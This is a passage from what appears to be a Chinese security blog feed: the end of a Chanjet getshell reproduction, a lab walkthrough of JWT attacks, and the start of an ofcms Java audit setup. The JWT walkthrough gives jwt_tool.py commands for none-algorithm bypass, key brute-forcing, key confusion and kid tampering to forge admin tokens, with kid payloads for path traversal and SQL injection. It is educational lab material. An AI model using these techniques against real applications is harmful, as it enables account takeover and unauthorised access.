data-fancybox="gallery" data-src="/../images/chanjet/image-20221024075122109.png" data-caption="image-20221024075122109"><img src="/../images/chanjet/image-20221024075122109.png" alt="image-20221024075122109"></a></p><p>这里得配合目录穿越上传预编译文件才能成功 Getshell，这边没能成功复现。这边是直接把文件拉到网站目录下的，实战中可能存在 asp 上传成功解析，不需要上传预编译文件的可能。</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024081450142.png" data-caption="image-20221024081450142"><img src="/../images/chanjet/image-20221024081450142.png" alt="image-20221024081450142"></a></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>通过这次的漏洞复现，还是能学习到很多的知识点，从环境的搭建、源码的分析、dll反编译再到漏洞原理分析，一步接一步打开思路，加深漏洞原理的学习，从一个知识点扩展到其它分支知识，总体上收获良好。</p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.o2oxy.cn/4104.html</span><br><span class="line">https://cloud.tencent.com/developer/article/1381405</span><br><span class="line">https://www.debugease.com/aspdotnet/74941.html</span><br><span class="line">https://www.buaq.net/go-53733.html</span><br><span class="line">https://blog.csdn.net/xiayu729100940/article/details/126646035</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 畅捷通 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞系列-JWT攻击手段考究</title>
      <link href="/2022/10/22/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E8%80%83%E7%A9%B6/"/>
      <url>/2022/10/22/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、JWT简述"><a href="#一、JWT简述" class="headerlink" title="一、JWT简述"></a>一、JWT简述</h2><p>JWT(Json Web Token)是一种标准化格式，用于在系统之间发送经过加密签名的 JSON 数据，常用于系统身份认证、会话管理和访问控制机制。其格式主要由头信息（header）、消息体（payload）、签名（signature）3部分组成。</p><h2 id="二、JWT格式"><a href="#二、JWT格式" class="headerlink" title="二、JWT格式"></a>二、JWT格式</h2><h3 id="1、格式规则"><a href="#1、格式规则" class="headerlink" title="1、格式规则"></a>1、格式规则</h3><p>如下为 JWT 例子，分为三个部分，第一步部分为头信息（header）、第二部分为消息体（payload）、第三部分为签名（signature），数据经过加密处理后通过符号 <code>.</code> 进行拼接后得到完整的JWT Token 值</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure></div><br/><p>利用 jwt.io 网站进行在线解密获取其信息，如下图：</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022005803698.png" data-caption="image-20221022005803698"><img src="/../images/jwt/image-20221022005803698.png" alt="image-20221022005803698"></a></p><h3 id="2、加密规则"><a href="#2、加密规则" class="headerlink" title="2、加密规则"></a>2、加密规则</h3><p>第一部分：头信息（header），该部分定义了固定的算法为 “HS256”，token类型为 “JWT”,该部分 Json 数据需经过 base64url 加密后得到第一部分数据，以下为原始数据及加密处理后数据</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022014816164.png" data-caption="image-20221022014816164"><img src="/../images/jwt/image-20221022014816164.png" alt="image-20221022014816164"></a></p><p>第二部分：消息体-payload，该部分主要为一些功能点的数据值，这一部分的 JSON 数据也需要进行 base64url 加密处理，以下为原始数据及加密处理后数据</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span><span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022015337482.png" data-caption="image-20221022015337482"><img src="/../images/jwt/image-20221022015337482.png" alt="image-20221022015337482"></a></p><p>第三部分：签名（signature），将前面第一、第二部分经过加密处理后的数据利用符号 <code>.</code> 拼接起来，然后再利用 “HS256” 加密算法进行加密得到第三部分加密数据，三部分通过符号 <code>.</code> 拼接后得到完整的 JWT Token 值，以下为原始数据及加密处理后数据</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64url(</span><br><span class="line"> HMACSHA256(</span><br><span class="line"> base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line"> your<span class="number">-256</span>-bit-secret (秘钥加盐)</span><br><span class="line"> )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure></div><br/><h2 id="三、JWT-危害及攻击点"><a href="#三、JWT-危害及攻击点" class="headerlink" title="三、JWT 危害及攻击点"></a>三、JWT 危害及攻击点</h2><p>JWT 通常以伪造任意值创建自己的有效令牌，提升自己的权限或冒充其他用户，从而完全接管这些用户的账户，主要攻击点有以下几部分：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空算法验证</span><br><span class="line">不验证签名内容分</span><br><span class="line">密钥泄露&amp;暴力破解密钥</span><br><span class="line">密码混淆攻击</span><br><span class="line">篡改 JWT Header，kid 指定攻击</span><br></pre></td></tr></table></figure></div><br/><h2 id="四、靶场学习"><a href="#四、靶场学习" class="headerlink" title="四、靶场学习"></a>四、靶场学习</h2><p>在线靶场</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jwt-lab.herokuapp.com/challenges</span><br></pre></td></tr></table></figure></div><br/><h3 id="1、空算法验证"><a href="#1、空算法验证" class="headerlink" title="1、空算法验证"></a>1、空算法验证</h3><p>JWT 值 Header 中的 “alg” 参数用于声明加密算法，如果应用程序没有有效验证 “alg” 的值，那么我们可以将其值更改为 “none”，绕过签名验证</p><p>进入 jwt-lab 靶场，创建一个账号</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022024849697.png" data-caption="image-20221022024849697"><img src="/../images/jwt/image-20221022024849697.png" alt="image-20221022024849697"></a><br><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022024927517.png" data-caption="image-20221022024927517"><img src="/../images/jwt/image-20221022024927517.png" alt="image-20221022024927517"></a></p><p>点击进入 “None Algorithm” 靶场，利用刚才注册的账号进行登录，Burp 抓包</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025314222.png" data-caption="image-20221022025314222"><img src="/../images/jwt/image-20221022025314222.png" alt="image-20221022025314222"></a></p><p>看到 Cookie 处的 chanllenge 中的值使用的是 JWT 格式</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025516380.png" data-caption="image-20221022025516380"><img src="/../images/jwt/image-20221022025516380.png" alt="image-20221022025516380"></a></p><p>将前面两部分进行解密得加密算法为 “RS256”、用户名为 “woohoo”</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025952064.png" data-caption="image-20221022025952064"><img src="/../images/jwt/image-20221022025952064.png" alt="image-20221022025952064"></a></p><p>将加密算法改为 “none” 然后将 JWT Header 头部分进行 base64url 编码，最后替换原始的 JWT Header 头的第一部分利用 Burp 重放，若依然返回正确页面则存在漏洞，我们把 Result 中 <code>eyJhbGciOiJub25lIn0=</code> , “&#x3D;” 去掉，这里编码后不应该出现，暂时先不管。</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022031534531.png" data-caption="image-20221022031534531"><img src="/../images/jwt/image-20221022031534531.png" alt="image-20221022031534531"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022031706787.png" data-caption="image-20221022031706787"><img src="/../images/jwt/image-20221022031706787.png" alt="image-20221022031706787"></a></p><p>替换为 “none” 仍能正常访问，绕过了签名算法，存在 “空算法验证” 漏洞</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022032053932.png" data-caption="image-20221022032053932"><img src="/../images/jwt/image-20221022032053932.png" alt="image-20221022032053932"></a></p><p>实战中可修改第二部分-消息体（payload）中的数据，配合该漏洞进行攻击，将第二部分的 “woohoo” 改为 “admin”，值为 <code>eyJuYW1lIjoiYWRtaW4ifQ</code> ,然后 Burp 放包</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022032851198.png" data-caption="image-20221022032851198"><img src="/../images/jwt/image-20221022032851198.png" alt="image-20221022032851198"></a></p><p>修改后登录用户更改为 “admin”</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022033129331.png" data-caption="image-20221022033129331"><img src="/../images/jwt/image-20221022033129331.png" alt="image-20221022033129331"></a></p><p>原始为 “woohoo”</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022033318882.png" data-caption="image-20221022033318882"><img src="/../images/jwt/image-20221022033318882.png" alt="image-20221022033318882"></a></p><h3 id="2、不验证签名内容"><a href="#2、不验证签名内容" class="headerlink" title="2、不验证签名内容"></a>2、不验证签名内容</h3><p>如果服务端没有对 JWT 签名部分进行校验，那么我们就可以直接删除最后的签名部分，使格式变为 <code>&#123;Header.Payload.&#125;</code>，此时可以修改 <code>Payload</code> 内容为其他用户信息，伪造用户 token 值。这里直接利用 <code>jwt_tool.py</code> 工具进行验证，若证明存在漏洞再自行修改 <code>payload</code> 部分进行测试，也可直接删掉第三部分，若依然返回正确的页面则存在漏洞，这里没有必要利用这个工具去测试，直接删掉 JWT 值第三部分内容就行，这里为了引出这个工具，叭啦一下</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022055718503.png" data-caption="image-20221022055718503"><img src="/../images/jwt/image-20221022055718503.png" alt="image-20221022055718503"></a></p><h3 id="3、密钥泄露-amp-暴力破解密钥"><a href="#3、密钥泄露-amp-暴力破解密钥" class="headerlink" title="3、密钥泄露&amp;暴力破解密钥"></a>3、密钥泄露&amp;暴力破解密钥</h3><p>若JWT签名使用了 “HMAC” 算法（对称加密算法），则可对其 Key 进行爆破，若爆破出 key 值则可以伪造用户 token 值进行攻击。测试过程中如果发现存在密钥泄露的情况下则可直接使用工具重新生成 JWT 值，伪造数据，若没有则需要依靠字典，若 key 值为弱密钥则可进行下一步攻击。</p><p>进入 “Weak signature” 靶场，利用注册账号登录，获取到 challenge 中的 JWT 值</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022060207246.png" data-caption="image-20221022060207246"><img src="/../images/jwt/image-20221022060207246.png" alt="image-20221022060207246"></a></p><p>通过解码得知使用了 “HS256” 算法，”HS256” 为 “HMAC” 算法的其中一种，为对称加密算法，即使用同一个密钥对JWT进行签名和认证，意味着也会对 JWT 进行签名的密钥也用于对其进行验证（注：对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文）</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022060336778.png" data-caption="image-20221022060336778"><img src="/../images/jwt/image-20221022060336778.png" alt="image-20221022060336778"></a></p><p>这里使用 jwt_tool.py 工具进行测试 <code>python3 jwt_tool.py jwt值</code>,首先验证是否是可破解的密钥，发现是 “HS256”,可尝试进行 key 爆破</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022061627075.png" data-caption="image-20221022061627075"><img src="/../images/jwt/image-20221022061627075.png" alt="image-20221022061627075"></a></p><p>爆破密钥 <code>python3 jwt_tool.py jwt值 -C -d wordlists.txt </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022062515948.png" data-caption="image-20221022062515948"><img src="/../images/jwt/image-20221022062515948.png" alt="image-20221022062515948"></a></p><p>利用爆破出来的 key 值对 jwt 进行重新签名</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022062806245.png" data-caption="image-20221022062806245"><img src="/../images/jwt/image-20221022062806245.png" alt="image-20221022062806245"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022063014666.png" data-caption="image-20221022063014666"><img src="/../images/jwt/image-20221022063014666.png" alt="image-20221022063014666"></a></p><p>将生成的 jwt 值到 Burp 进行重放</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022063145114.png" data-caption="image-20221022063145114"><img src="/../images/jwt/image-20221022063145114.png" alt="image-20221022063145114"></a></p><br/><h3 id="4、密码混淆攻击"><a href="#4、密码混淆攻击" class="headerlink" title="4、密码混淆攻击"></a>4、密码混淆攻击</h3><p>当 JWT 签名算法使用 “RSA “ 加密算法时，RSA 是非对称加密算法，需要两个密钥，先用私钥加密生成 JWT ，然后使用其对应的公钥来解密验证。即假设我们能够将签名算法从 “RS256” 更改为 “HS256”，我们就可以强制应用程序仅使用一个密钥来完成加密和解密这两项任务，此时服务端代码将使用公钥作为密钥，然后使用HS256算法验证签名。（注：非对称加密算法需要两个密钥： 公开密钥 （publickey:简称公钥）和私有密钥（privatekey:简称私钥）。 公钥 与 私钥 是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。 因为加密和 解密 使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。）</p><p>进入 “Exposed Key” 靶场，利用注册账号登录，获取到 challenge 中的 JWT 值</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064158310.png" data-caption="image-20221022064158310"><img src="/../images/jwt/image-20221022064158310.png" alt="image-20221022064158310"></a></p><p>靶场已提供了公钥信息 “public key”（假装通过技术手段获取到泄露的公钥），将其复制保存为本地文件 <strong>public_key</strong> （注意：先将公钥复制到 sublime 删掉前面的空格；文件末尾还有一行空行；文件名没有后缀名）</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064011276.png" data-caption="image-20221022064011276"><img src="/../images/jwt/image-20221022064011276.png" alt="image-20221022064011276"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071102736.png" data-caption="image-20221022071102736"><img src="/../images/jwt/image-20221022071102736.png" alt="image-20221022071102736"></a></p><p>这次就不去解码了，直接利用 jwt_tool.py 进行信息获取，加密方式为 “RS256” ，用户名为 “woohoo”</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022064328897.png" data-caption="image-20221022064328897"><img src="/../images/jwt/image-20221022064328897.png" alt="image-20221022064328897"></a></p><p>利用获取到的公钥信息，使用 jwt_tool.py 工具，对 JWT 值使用 “HS256” 算法进行签名 <code>python3 jwt_tool.py -X k -pk public_key jwt值</code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071252972.png" data-caption="image-20221022071252972"><img src="/../images/jwt/image-20221022071252972.png" alt="image-20221022071252972"></a></p><p>将重新生成的 JWT 值到 Burp 重放，若返回值与，RS256 算法签名的 JWT 值一样的页面则证明存在漏洞</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071350414.png" data-caption="image-20221022071350414"><img src="/../images/jwt/image-20221022071350414.png" alt="image-20221022071350414"></a></p><p>进一步利用，修改 JWT 第二部分消息体(Payload)，伪造 “admin” 用户 token 值</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071704133.png" data-caption="image-20221022071704133"><img src="/../images/jwt/image-20221022071704133.png" alt="image-20221022071704133"></a> </p><p><code>python3 jwt_tool.py -X k -pk public_key eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ==. </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071937771.png" data-caption="image-20221022071937771"><img src="/../images/jwt/image-20221022071937771.png" alt="image-20221022071937771"></a></p><p>成功伪造 admin 用户的 token 进行登录</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022071907390.png" data-caption="image-20221022071907390"><img src="/../images/jwt/image-20221022071907390.png" alt="image-20221022071907390"></a></p><h3 id="5、篡改-jwt-header，kid指定攻击"><a href="#5、篡改-jwt-header，kid指定攻击" class="headerlink" title="5、篡改 jwt header，kid指定攻击"></a>5、篡改 jwt header，kid指定攻击</h3><p>密钥 ID (kid) 是Header中一个可选标头，即 key ID，用于指示文件系统或数据库中存在的特定密钥，然后使用其内容来验证签名</p><p>进入 “Vulnerable Kid “ 靶场，输入账户密码获取 JWT 值。解码后，得知存在 “kid”</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225037179.png" data-caption="image-20221022225037179"><img src="/../images/jwt/image-20221022225037179.png" alt="image-20221022225037179"></a></p><p>也可以直接使用 jwt_tool.py 进行解码</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225206954.png" data-caption="image-20221022225206954"><img src="/../images/jwt/image-20221022225206954.png" alt="image-20221022225206954"></a></p><p>将kid内容修改为 “&#x2F;dev&#x2F;null” ，并将 Payload 中 “name” 修改为 “admin” ，然后生成新的 token 。<code>python3 jwt_tool.py jwt值 -I -hc kid -hv &quot;/dev/null&quot; -pc name -pv &quot;admin&quot; -S hs256 </code></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225653680.png" data-caption="image-20221022225653680"><img src="/../images/jwt/image-20221022225653680.png" alt="image-20221022225653680"></a></p><p>生成后的 JWT 解码后为</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022230209305.png" data-caption="image-20221022230209305"><img src="/../images/jwt/image-20221022230209305.png" alt="image-20221022230209305"></a></p><p>最后将生成的 token 到 Burp 放包，实现伪造 admin 身份</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022225519054.png" data-caption="image-20221022225519054"><img src="/../images/jwt/image-20221022225519054.png" alt="image-20221022225519054"></a></p><p>若 kid 值没有存在过滤，有可能存在其它漏洞，如：任意文件读取、SQL注入、命令执行等，例子如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line"> &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line"> &quot;kid&quot; : &quot;../../etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line"> &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line"> &quot;kid&quot; : &quot;admin&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>经过学习发现，JWT 攻击面大多为伪造令牌从而提升权限或冒充其它用户，进而构建下一步攻击。总体上攻击点还是取决于 JWT 的加密方式、签名验证等是否安全。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/225947</span><br><span class="line">https://mp.weixin.qq.com/s/BP33m2Z5LeNcU2owGTSM2Q</span><br><span class="line">https://mp.weixin.qq.com/s/puYElYPTz6zfEjND0jcm2g</span><br><span class="line">https://simplycalc.com/base64url-encode.php</span><br><span class="line">https://adamc95.medium.com/json-web-token-lab-guide-c402857fa44c</span><br><span class="line">https://jwt.io/</span><br><span class="line">https://base64.us/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> JWT攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(四)-ofcms v1.1.3</title>
      <link href="/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"/>
      <url>/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>该文章结合了之前审计时学习到的知识点，参考已有的文章，虽然该源码初步学习审计起来并不算困难，但距离独自审计还有一段距离，该 CMS 作为入门审计项目，对新手还算比较友好。当然该 CMS 还有其它漏洞点还没有进行审计学习，后续有时间再补充。</p><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>1、<a href="https://github.com/Funsiooo/Vuln_Bulid">导入源码</a>，重新加载项目，源码地址：</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230013447.png" data-caption="image-20221019230013447"><img src="/../images/Java/ofcms/image-20221019230013447.png" alt="image-20221019230013447"></a></p><p>配置 Tomcat 环境</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230108972.png" data-caption="image-20221019230108972"><img src="/../images/Java/ofcms/image-20221019230108972.png" alt="image-20221019230108972"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230232755.png" data-caption="image-20221019230232755"><img src="/../images/Java/ofcms/image-20221019230232755.png" alt="image-20221019230232755"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230249450.png" data-caption="image-20221019230249450"><img src="/../images/Java/ofcms/image-20221019230249450.png" alt="image-20221019230249450"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230312244.png" data-caption="image-20221019230312244"><img src="/../images/Java/ofcms/image-20221019230312244.png" alt="image-20221019230312244"></a></p><p>修改数据库连接环境 <code>ofcms\ofcms-admin\src\main\resources\dev\conf\db-config.properties</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230547219.png" data-caption="image-20221019230547219"><img src="/../images/Java/ofcms/image-20221019230547219.png" alt="image-20221019230547219"></a></p><p><code>path</code> 必须修改为系统可访问的路径，由于我自己环境为虚拟机，只有C盘，所以出现报错，若在真实环境下带d盘则不用理会</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230724781.png" data-caption="image-20221019230724781"><img src="/../images/Java/ofcms/image-20221019230724781.png" alt="image-20221019230724781"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019230853811.png" data-caption="image-20221019230853811"><img src="/../images/Java/ofcms/image-20221019230853811.png" alt="image-20221019230853811"></a></p><p>运行启动环境，点击右上角运行符号即可</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231020331.png" data-caption="image-20221019231020331"><img src="/../images/Java/ofcms/image-20221019231020331.png" alt="image-20221019231020331"></a></p><p>运行成功后会自动弹出安装界面</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231045182.png" data-caption="image-20221019231045182"><img src="/../images/Java/ofcms/image-20221019231045182.png" alt="image-20221019231045182"></a></p><p>点击下一步会出现报错，需要将访问地址改为 <code>http://本地IP:端口/项目路径</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231159805.png" data-caption="image-20221019231159805"><img src="/../images/Java/ofcms/image-20221019231159805.png" alt="image-20221019231159805"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231216862.png" data-caption="image-20221019231216862"><img src="/../images/Java/ofcms/image-20221019231216862.png" alt="image-20221019231216862"></a></p><p>这里的数据库环境依旧使用phpstudy</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231304504.png" data-caption="image-20221019231304504"><img src="/../images/Java/ofcms/image-20221019231304504.png" alt="image-20221019231304504"></a></p><p>输入数据库密码进入下一步，需要创建一个空的，名为 <code>ofcms</code> 的数据库</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231707919.png" data-caption="image-20221019231707919"><img src="/../images/Java/ofcms/image-20221019231707919.png" alt="image-20221019231707919"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231757207.png" data-caption="image-20221019231757207"><img src="/../images/Java/ofcms/image-20221019231757207.png" alt="image-20221019231757207"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019231916420.png" data-caption="image-20221019231916420"><img src="/../images/Java/ofcms/image-20221019231916420.png" alt="image-20221019231916420"></a></p><p>接下来就系重点了，就是这个无限重装bug搞了我很久，因为如果按照提示重启web容器（idea run），依然会进入安装界面</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232009809.png" data-caption="image-20221019232009809"><img src="/../images/Java/ofcms/image-20221019232009809.png" alt="image-20221019232009809"></a></p><p>这里需要修改数据库连接配置文件名，将 <code>db-config</code> 改为 <code>db</code>,之前因为连接数据库的 IP 地址填为本地 IP 地址 <code>192.x.x.x</code>，这样修改 <code>db-config</code> 为 <code>db</code> 则会报错，修改为 <code>localhost</code> 才不会报错</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232111734.png" data-caption="image-20221019232111734"><img src="/../images/Java/ofcms/image-20221019232111734.png" alt="image-20221019232111734"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232345630.png" data-caption="image-20221019232345630"><img src="/../images/Java/ofcms/image-20221019232345630.png" alt="image-20221019232345630"></a></p><p>成功搭建</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232502415.png" data-caption="image-20221019232502415"><img src="/../images/Java/ofcms/image-20221019232502415.png" alt="image-20221019232502415"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232519216.png" 